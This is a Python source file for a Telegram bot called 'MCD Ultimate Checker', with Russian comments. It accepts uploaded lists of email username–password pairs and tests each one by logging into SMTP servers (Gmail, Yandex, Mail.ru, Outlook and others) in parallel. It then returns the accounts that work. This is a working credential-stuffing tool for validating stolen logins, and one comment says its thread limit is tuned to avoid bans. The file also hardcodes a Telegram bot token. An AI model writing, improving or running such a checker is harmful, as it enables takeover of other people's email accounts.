import telebot
import smtplib
import ssl
import threading
import time
import os
from concurrent.futures import ThreadPoolExecutor

# --- КОНФИГУРАЦИЯ ---
TOKEN = "8509142665:AAEiycyacUVbhq6-iZ1moMcv8lVKm4jQN6o"
MAX_THREADS = 15  # Оптимально для Termux и защиты от банов
TIMEOUT = 7       # Секунд на один аккаунт

bot = telebot.TeleBot(TOKEN)

# База популярных серверов для авто-подбора (если формат mail:pass)
COMMON_SERVERS = {
    'gmail.com': ('smtp.gmail.com', 465),
    'yandex.ru': ('smtp.yandex.ru', 465),
    'mail.ru': ('smtp.mail.ru', 465),
    'hotmail.com': ('smtp.office365.com', 587),
    'outlook.com': ('smtp.office365.com', 587),
    'rambler.ru': ('smtp.rambler.ru', 465)
}

def check_logic(line):
    """Ядро проверки одного аккаунта"""
    try:
        # 1. Парсинг формата
        if '|' in line:
            parts = line.split('|')
            host, port, user, password = parts[0], int(parts[1]), parts[2], parts[3]
        else:
            line = line.replace(';', ':')
            user, password = line.split(':', 1)
            domain = user.split('@')[1].lower()
            host, port = COMMON_SERVERS.get(domain, (f"smtp.{domain}", 587))

        # 2. Попытка входа
        context = ssl.create_default_context()
        if port == 465:
            with smtplib.SMTP_SSL(host, port, timeout=TIMEOUT, context=context) as server:
                server.login(user, password)
        else:
            with smtplib.SMTP(host, port, timeout=TIMEOUT) as server:
                if port == 587:
                    server.starttls(context=context)
                server.login(user, password)
        
        return "GOOD", f"{host}|{port}|{user}|{password}"
    except smtplib.SMTPAuthenticationError:
        return "BAD", None
    except Exception:
        return "ERROR", None

def process_base(message, file_path):
    chat_id = message.chat.id
    
    # Читаем базу
    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        lines = [l.strip() for l in f if l.strip()]
    
    os.remove(file_path)
    total = len(lines)
    
    # Создаем красивый статус
    status_msg = bot.send_message(chat_id, "⚙️ **Инициализация системы...**", parse_mode="Markdown")
    
    goods = []
    bads = 0
    errors = 0
    checked = 0
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(check_logic, line): line for line in lines}
        
        for future in futures:
            res, data = future.result()
            checked += 1
            
            if res == "GOOD": goods.append(data)
            elif res == "BAD": bads += 1
            else: errors += 1

            # Обновление UI каждые 10 аккаунтов или в конце
            if checked % 10 == 0 or checked == total:
                percent = int((checked / total) * 100)
                bar = "▓" * (percent // 10) + "░" * (10 - (percent // 10))
                
                ui_text = (
                    f"🛡 **MCD ULTIMATE CHECKER**\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📊 Прогресс: `{percent}%`\n"
                    f"[{bar}]\n\n"
                    f"✅ Валид: `{len(goods)}` | ❌ Бэд: `{bads}`\n"
                    f"⚠️ Пропущено: `{errors}` | Всего: `{total}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"⏱ Времени прошло: {int(time.time() - start_time)}с"
                )
                try:
                    bot.edit_message_text(ui_text, chat_id, status_msg.message_id, parse_mode="Markdown")
                except:
                    pass

    # Финал
    if goods:
        res_name = f"Result_{chat_id}.txt"
        with open(res_name, 'w') as f: f.write("\n".join(goods))
        with open(res_name, 'rb') as f:
            bot.send_document(chat_id, f, caption=f"🏆 **Проверка завершена!**\nНайдено `{len(goods)}` рабочих аккаунтов.")
        os.remove(res_name)
    else:
        bot.send_message(chat_id, "❌ **Результатов нет.** Все аккаунты невалидны или порты закрыты.")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, 
        "👋 **MCD Ultimate Checker готов.**\n\n"
        "Пришли мне `.txt` файл с базой.\n"
        "Форматы: `host|port|user|pass` или `user:pass`.", 
        parse_mode="Markdown")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    if not message.document.file_name.endswith('.txt'):
        return bot.reply_to(message, "⚠️ Только файлы .txt")

    file_info = bot.get_file(message.document.file_id)
    downloaded = bot.download_file(file_info.file_path)
    
    path = f"tmp_{message.chat.id}.txt"
    with open(path, 'wb') as f: f.write(downloaded)
    
    threading.Thread(target=process_base, args=(message, path)).start()

print("Бот в сети...")
bot.polling(none_stop=True)
